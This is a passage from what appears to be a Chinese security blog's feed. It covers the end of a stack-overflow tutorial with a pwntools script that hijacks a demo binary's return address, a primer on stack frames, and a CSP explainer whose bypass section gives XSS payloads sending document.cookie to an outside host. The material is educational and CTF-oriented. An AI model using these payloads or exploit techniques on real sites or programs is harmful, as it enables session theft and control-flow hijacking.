alt=""></p><p>由前面可知，变量s相对于ESP和EBP的偏移量分别为ESP+4h和EBP-14h，这里只看其距离EBP的距离，计算出s的地址为0xffffd028-14h=0xffffd014。</p><p>为了验证一下本次IDA计算出的偏移值是否准确，我们接着在gets()函数的下一条指令地址处即0x08048466中打下断点，再c继续往下运行，要求输入字符串，这里输入“hello”之后程序就停止在断点处：</p><p><img src="/2019/03/03/栈溢出基本原理/11.png" alt=""></p><p>可以看到，存放“hello”的内存地址即s的地址为0xffffd014，且ESP下一次会指向该地址。该地址和使用IDA给出的偏移量计算出来的结果一致，即这次的IDA计算结果可信。</p><p>由此可知，s的地址为0xffffd014，则s距离EBP偏移量为14h，则s与函数返回地址的偏移为14h+4=18h。</p><h4 id="（2）使用GDB-pattern字符串溢出计算偏移量"><a href="#（2）使用GDB-pattern字符串溢出计算偏移量" class="headerlink" title="（2）使用GDB pattern字符串溢出计算偏移量"></a>（2）使用GDB pattern字符串溢出计算偏移量</h4><p>GDB的pattern_create创建计算溢出偏移量的字符串，在输入内容时输入即可：</p><p><img src="/2019/03/03/栈溢出基本原理/12.png" alt=""></p><p><img src="/2019/03/03/栈溢出基本原理/13.png" alt=""></p><p>记下此刻的EIP值，即0x44414128或字符“(AAD”，再输入pattern_offset中计算出偏移值：</p><p><img src="/2019/03/03/栈溢出基本原理/14.png" alt=""></p><p>得出s与函数返回地址的偏移为24，即18h=14h+4。</p><h3 id="6、编写payload"><a href="#6、编写payload" class="headerlink" title="6、编写payload"></a>6、编写payload</h3><p>在下面payload中，前面14h个字节码用“a”覆盖，将EBP覆盖为“bbbb”，最后插入小端存储形式的pwn()函数地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./stack_test"</span>)</span><br><span class="line">pwn_addr = <span class="number">0x0804843B</span></span><br><span class="line">payload = flat([<span class="string">"a"</span> * <span class="number">0x14</span>, <span class="string">"bbbb"</span>, p32(pwn_addr)])</span><br><span class="line"><span class="comment"># payload = flat(["a" * 0x14, p32(1), p32(pwn_addr)])</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> sh.recvall()</span><br></pre></td></tr></table></figure><p>运行payload，直接栈溢出执行了pwn()函数：</p><p><img src="/2019/03/03/栈溢出基本原理/15.png" alt=""></p><p>整个栈溢出的漏洞发现及利用过程大致如此，当然还有其他的一些技巧这里还未涉及。</p><h2 id="栈溢出步骤小结"><a href="#栈溢出步骤小结" class="headerlink" title="栈溢出步骤小结"></a>栈溢出步骤小结</h2><p>Demo是具体细化的步骤，总体而言主要分为两个步骤，先是找到危险函数确定存在栈溢出漏洞，然后就是通过调试分析计算出栈溢出攻击利用需要溢出的偏移量，最后就可以顺利地写exp进行利用。</p><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式：</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求：</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic/" target="_blank" rel="noopener">栈溢出原理</a></p><p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;栈溢出基本原理&quot;&gt;&lt;a href=&quot;#栈溢出基本原理&quot; class=&quot;headerlink&quot; title=&quot;栈溢出基本原理&quot;&gt;&lt;/a&gt;栈溢出基本原理&lt;/h2&gt;&lt;p&gt;栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中
      
    
    </summary>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/categories/Pwn/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="栈溢出" scheme="https://Mi1k7ea.github.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>栈基础</title>
    <link href="https://Mi1k7ea.github.com/2019/03/03/%E6%A0%88%E5%8F%8A%E6%A0%88%E5%B8%A7/"/>
    <id>https://Mi1k7ea.github.com/2019/03/03/栈及栈帧/</id>
    <published>2019-03-03T01:13:09.000Z</published>
    <updated>2019-03-03T11:02:28.164Z</updated>
    
    <content type="html"><![CDATA[<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，两者都是对栈顶的操作。</p><p>每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。</p><p><strong>程序的栈是从进程地址空间的高地址向低地址增长的，即从栈顶处增长</strong>。</p><p><img src="/2019/03/03/栈及栈帧/1.png" alt=""></p><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>栈帧（Stack Frame）是利用EBP寄存器访问栈内局部变量、参数、函数返回地址等的手段，在程序中用于声明局部变量、调用函数等。</p><p>整个过程为：调用某函数时，先把用作基准点（函数起始地址）的ESP值保存到EBP并维持在函数内部。无论ESP的值如何变化，以EBP的值为基准能够准确安全访问到相关函数的局部变量、参数、返回地址等。</p><p>基本的栈帧结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP</span><br><span class="line">MOV EBP,ESP</span><br><span class="line">...</span><br><span class="line">MOV ESP,EBP</span><br><span class="line">POP EBP</span><br><span class="line">RETN</span><br></pre></td></tr></table></figure><p>具体的可参考之前的博文：<a href="https://blog.csdn.net/SKI_12/article/details/80554677" target="_blank" rel="noopener">栈帧</a></p><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><blockquote><p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p></blockquote><p>函数调用发生和结束时调用栈的变化如图：</p><p><img src="/2019/03/03/栈及栈帧/2.png" alt=""></p><p>函数状态主要涉及三个寄存器——ESP，EBP，EIP。ESP用来在Push和Pop时存储函数调用栈的栈顶地址。EBP用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置，即栈帧作用。EIP用来存储即将执行的程序指令的地址，CPU依照 EIP的存储内容读取指令并执行，EIP随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p><h3 id="函数调用开始时的栈变化"><a href="#函数调用开始时的栈变化" class="headerlink" title="函数调用开始时的栈变化"></a>函数调用开始时的栈变化</h3><p>下面让我们来看看发生函数调用开始时，栈顶函数状态以及上述寄存器的变化。</p><p><strong>变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。</strong></p><h4 id="1、逆序Push被调函数的参数入栈"><a href="#1、逆序Push被调函数的参数入栈" class="headerlink" title="1、逆序Push被调函数的参数入栈"></a>1、逆序Push被调函数的参数入栈</h4><p>首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存，如下图（注意一点就是，和开始的图的地址高低位方向不一样，现在是上面是高位下面是低位）：</p><p><img src="/2019/03/03/栈及栈帧/3.png" alt=""></p><h4 id="2、Push调用函数的下一条指令的地址入栈"><a href="#2、Push调用函数的下一条指令的地址入栈" class="headerlink" title="2、Push调用函数的下一条指令的地址入栈"></a>2、Push调用函数的下一条指令的地址入栈</h4><p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存：</p><p><img src="/2019/03/03/栈及栈帧/4.png" alt=""></p><h4 id="3、Push-EBP构建栈帧"><a href="#3、Push-EBP构建栈帧" class="headerlink" title="3、Push EBP构建栈帧"></a>3、Push EBP构建栈帧</h4><p>再将当前的EBP寄存器的值（也就是调用函数的基地址）压入栈内，并将 EBP寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 EBP（基地址）信息得以保存。同时，EBP被更新为被调用函数（callee）的基地址：</p><p><img src="/2019/03/03/栈及栈帧/5.png" alt=""></p><h4 id="4、Push被调函数的局部变量等数据入栈"><a href="#4、Push被调函数的局部变量等数据入栈" class="headerlink" title="4、Push被调函数的局部变量等数据入栈"></a>4、Push被调函数的局部变量等数据入栈</h4><p>再之后是将被调用函数（callee）的局部变量等数据压入栈内：</p><p><img src="/2019/03/03/栈及栈帧/6.png" alt=""></p><p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。</p><h3 id="函数调用结束时的栈变化"><a href="#函数调用结束时的栈变化" class="headerlink" title="函数调用结束时的栈变化"></a>函数调用结束时的栈变化</h3><p>看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。</p><p><strong>变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。</strong></p><h4 id="1、Pop被调函数局部变量等数据出栈"><a href="#1、Pop被调函数局部变量等数据出栈" class="headerlink" title="1、Pop被调函数局部变量等数据出栈"></a>1、Pop被调函数局部变量等数据出栈</h4><p>首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。</p><p><img src="/2019/03/03/栈及栈帧/7.png" alt=""></p><h4 id="2、通过栈帧恢复调用函数基地址"><a href="#2、通过栈帧恢复调用函数基地址" class="headerlink" title="2、通过栈帧恢复调用函数基地址"></a>2、通过栈帧恢复调用函数基地址</h4><p>然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 EBP寄存器内。这样调用函数（caller）的 EBP（基地址）信息得以恢复。此时栈顶会指向返回地址。</p><p><img src="/2019/03/03/栈及栈帧/8.png" alt=""></p><h4 id="3、Pop调用函数下一条指令的地址到栈顶"><a href="#3、Pop调用函数下一条指令的地址到栈顶" class="headerlink" title="3、Pop调用函数下一条指令的地址到栈顶"></a>3、Pop调用函数下一条指令的地址到栈顶</h4><p>再将返回地址从栈内弹出，并存到 EIP寄存器内。这样调用函数（caller）的 EIP（指令）信息得以恢复。</p><p><img src="/2019/03/03/栈及栈帧/9.png" alt=""></p><p>至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了，中间的被调函数的参数会直接被略过而返回到调用函数的指令中继续执行。</p><p>函数调用约定可参考之前的博文：<a href="https://blog.csdn.net/SKI_12/article/details/80549743" target="_blank" rel="noopener">函数调用约定</a></p><p>另外推荐两个学习函数调用栈的详细的教程：</p><ul><li><p><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html" target="_blank" rel="noopener">C 语言函数调用栈 (一)</a></p></li><li><p><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">C 语言函数调用栈 (二)</a></p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro/" target="_blank" rel="noopener">栈介绍</a></p><p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;栈&quot;&gt;&lt;a href=&quot;#栈&quot; class=&quot;headerlink&quot; title=&quot;栈&quot;&gt;&lt;/a&gt;栈&lt;/h2&gt;&lt;p&gt;栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，两者都是对
      
    
    </summary>
    
      <category term="二进制基础" scheme="https://Mi1k7ea.github.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="栈溢出" scheme="https://Mi1k7ea.github.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>CSP策略及绕过技巧小结</title>
    <link href="https://Mi1k7ea.github.com/2019/02/24/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/"/>
    <id>https://Mi1k7ea.github.com/2019/02/24/CSP策略及绕过技巧小结/</id>
    <published>2019-02-24T05:47:07.000Z</published>
    <updated>2019-03-01T16:05:27.313Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为CSP"><a href="#何为CSP" class="headerlink" title="何为CSP"></a>何为CSP</h2><p>CSP（Content Security Policy）即内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。</p><p>CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。</p><h2 id="CSP语法"><a href="#CSP语法" class="headerlink" title="CSP语法"></a>CSP语法</h2><p>CSP中常见的header字段为Content-Security-Policy。</p><p>一个CSP头由多组CSP策略组成，中间由分号分隔，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; www.baidu.com; script-src &apos;unsafe-inline&apos;</span><br></pre></td></tr></table></figure><p>其中每一组策略包含一个策略指令和一个内容源列表。</p><h3 id="策略指令"><a href="#策略指令" class="headerlink" title="策略指令"></a>策略指令</h3><h4 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h4><p>default-src作为所有其他指令的备用，一般来说default-src ‘none’; script-src ‘self’这样的情况就会是script-src遵循self，其他的都会使用none。也就是说，除了被设置的指令以外，其余指令都会被设置为default-src指令所设置的属性。</p><h4 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h4><p>script-src指令限制了所有js脚本可以被执行的地方，包括通过链接方式加载的脚本url以及所有内联脚本，甚至包括各种方式的引用。其中还有一个很重要的参数叫’unsafe-inline’，如果加上这个参数，就不会阻止内联脚本，但这被认为是不安全的。</p><p>对于这个属性有个特殊的配置叫unsafe-eval，它会允许下面几个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`eval()Function()setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.`</span><br></pre></td></tr></table></figure><h4 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h4><p>style-src定义了页面中CSS样式的有效来源，包括下面三种引用的css属性，style也有个‘unsafe-inline’这个参数，同理会允许所有的内联css。</p><p>1、第一种是通过link标签加载的css，类似于<code>&lt;link href=&quot;001.css&quot; type=&quot;text/css&quot; rel=&quot;Stylesheet&quot;/&gt;</code></p><p>2、当然还有style标签</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"><span class="selector-class">.main</span>&#123; <span class="attribute">width</span>:<span class="number">1002px</span>; <span class="attribute">margin</span>:<span class="number">0</span> auto;&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>3、还有通过@import引入的样式表</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt; STYLE TYPE="text/css"&gt; </span><br><span class="line">@<span class="keyword">import</span> <span class="string">"example.css"</span>; </span><br><span class="line">@<span class="keyword">import</span> <span class="string">"style/other.css"</span>; </span><br><span class="line">&lt; /STYLE&gt;</span><br></pre></td></tr></table></figure><p>4、内联样式表，类似于<code>style=&quot;font-size:10px;font-color:#ff0000&quot;</code></p><h4 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h4><p>img-src定义了页面中图片和图标的有效来源。</p><h4 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h4><p>font-src定义了字体加载的有效来源。</p><h4 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h4><p>connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。如下例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="tag">&lt;<span class="name">a</span> <span class="attr">ping</span>=<span class="string">"https://not-example.com"</span>&gt;</span>...<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">  var xhr = new XMLHttpRequest();  xhr.open('GET', 'https://not-example.com/');  xhr.send();  var ws = new WebSocket("https://not-example.com/");          var es = new EventSource("https://not-example.com/");  navigator.sendBeacon("https://not-example.com/", &#123; ... &#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`</span><br></pre></td></tr></table></figure><h4 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h4><p>child-src 指定定义了 web workers 以及嵌套的浏览上下文（如frame和iframe）的源。</p><p>会匹配iframe和frame标签，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先设置csp</span><br><span class="line">Content-Security-Policy: child-src https://example.com/</span><br><span class="line">而下面的请求会被CSP拦截</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://not-example.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  var blockedWorker = new Worker("data:application/javascript,...");</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="manifest-src"><a href="#manifest-src" class="headerlink" title="manifest-src"></a>manifest-src</h4><p>manifest-src指令限制了从应用清单可以加载的url。</p><p>这个属性不太熟，比较常见的就是link：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">举个例子：</span><br><span class="line">Content-Security-Policy: manifest-src https://example.com/</span><br><span class="line">下面的请求会返回错误:</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"manifest"</span> <span class="attr">href</span>=<span class="string">"https://not-example.com/manifest"</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="内容源"><a href="#内容源" class="headerlink" title="内容源"></a>内容源</h3><p>内容源有三种：源列表、关键字和数据。</p><h4 id="源列表"><a href="#源列表" class="headerlink" title="源列表"></a>源列表</h4><p>源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘*‘)，端口号也可以使用通配符 (同样是 ‘*‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。</p><p> 有效的主机表达式包括：</p><p> http://*<a href="http://.foo.com" target="_blank" rel="noopener">.foo.com</a> （匹配所有使用 http协议加载 <a href="http://foo.com" target="_blank" rel="noopener">foo.com</a> 任何子域名的尝试。）</p><p> mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）</p><p> <a href="https://store.foo.com" target="_blank" rel="noopener">https://store.foo.com</a> （匹配所有使用 https协议访问 <a href="http://store.foo.com" target="_blank" rel="noopener">store.foo.com</a> 的尝试。）</p><p> 如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。</p><h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><ul><li><strong>‘none’</strong><br>代表空集；即不匹配任何 URL。两侧单引号是必须的。</li><li><strong>‘self’</strong><br>代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。</li><li><strong>‘unsafe-inline’</strong><br>允许使用内联资源，如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素，两侧单引号是必须的。</li><li><strong>‘unsafe-eval’</strong><br>允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。</li></ul><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p> <strong>data:</strong><br> 允许data: URI作为内容来源。</p><p><strong>mediastream:</strong><br> 允许mediastream: URI作为内容来源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; img-src &apos;self&apos; data:; media-src mediastream:</span><br></pre></td></tr></table></figure><h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><p>绕过场景其实是很多的，这里慢慢来收集吧，主要是先收集一些广泛公开的和CTF中遇到的吧。</p><h3 id="1、绕过default-src-‘none’"><a href="#1、绕过default-src-‘none’" class="headerlink" title="1、绕过default-src ‘none’"></a>1、绕过default-src ‘none’</h3><p>策略为：Content-Security-Policy: default-src ‘none’; </p><p>这种情况下，可以使用meta标签实现跳转：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=https://www.mi1k7ea.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure><p>Demo如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$nonce = md5(openssl_random_pseudo_bytes(16));</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &apos;none&apos;; &quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP Test&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&apos;content&apos;])) &#123;</span><br><span class="line">echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当我们输入<code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://192.168.43.201:8000/x.php?c=mi1k7ea&quot; &gt;</code>可以成功跳转至目标页面，当然也可以将cookie带出来：</p><p><img src="/2019/02/24/CSP策略及绕过技巧小结/3.png" alt=""></p><h3 id="2、形同虚设的script-src-‘unsafe-inline’"><a href="#2、形同虚设的script-src-‘unsafe-inline’" class="headerlink" title="2、形同虚设的script-src ‘unsafe-inline’"></a>2、形同虚设的script-src ‘unsafe-inline’</h3><p>策略中有一条为：script-src ‘unsafe-inline’; ，这条策略相当于直接让CSP几乎沦陷了大半。</p><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">window.location="https://www.mi1k7ea.com/x.php?c=[cookie]";</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">window.open('//www.mi1k7ea.com/?'+escape(document.cookie))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">window.location.href='https://www.mi1k7ea.com/?cookie='+document.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Demo代码还是之前的，把CSP修改一下，添加script-src ‘unsafe-inline’;即可。</p><p>输入<code>&lt;script&gt;window.location.href=&#39;http://192.168.43.201:8000/?cookie=&#39;+document.cookie&lt;/script&gt;</code>直接跳转并成功返回cookie：</p><p><img src="/2019/02/24/CSP策略及绕过技巧小结/4.png" alt=""></p><p>内嵌script都可以执行，当然可以直接执行本页面的JS，如输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>即可，这里的利用和XSS利用一致，没有啥绕过技巧，不再累赘。</p><h3 id="3、绕过xx-src"><a href="#3、绕过xx-src" class="headerlink" title="3、绕过xx-src *"></a>3、绕过xx-src *</h3><p>*号即允许匹配任何URL请求。但一般情况很少会遇到default-src <em>;或大部分xx-src </em>;这样的CSP策略，举一个简单的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;; connect-src &apos;self&apos;; frame-src *; script-src http://xxxxx/js/ &apos;nonce-xxx&apos;;font-src http://xxxx/fonts/ fonts.gstatic.com; style-src &apos;self&apos; &apos;unsafe-inline&apos;; img-src &apos;self&apos;</span><br></pre></td></tr></table></figure><p>很明显地可以找到，frame-src *，其对于iframe的来源并没有做任何限制，当然实际环境可能需要iframe标签来内联来包含别的页面。</p><p>可以利用CSRF漏洞。这里直接输入<code>&lt;iframe src=&quot;https://www.mi1k7ea.com&quot;&gt;&lt;/iframe&gt;</code>来测试：</p><p> <img src="/2019/02/24/CSP策略及绕过技巧小结/5.png" alt=""></p><p>当然，iframe也可以内嵌外部弹框的JS：</p><p><img src="/2019/02/24/CSP策略及绕过技巧小结/6.png" alt=""></p><p>查看页面元素，可以看到iframe内嵌包含进来的是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，其可以正常执行而无视掉<code>script-src http://xxxxx/js/ &#39;nonce-xxx&#39;;</code>的CSP策略。</p><h3 id="4、利用link绕过xx-src-self"><a href="#4、利用link绕过xx-src-self" class="headerlink" title="4、利用link绕过xx-src 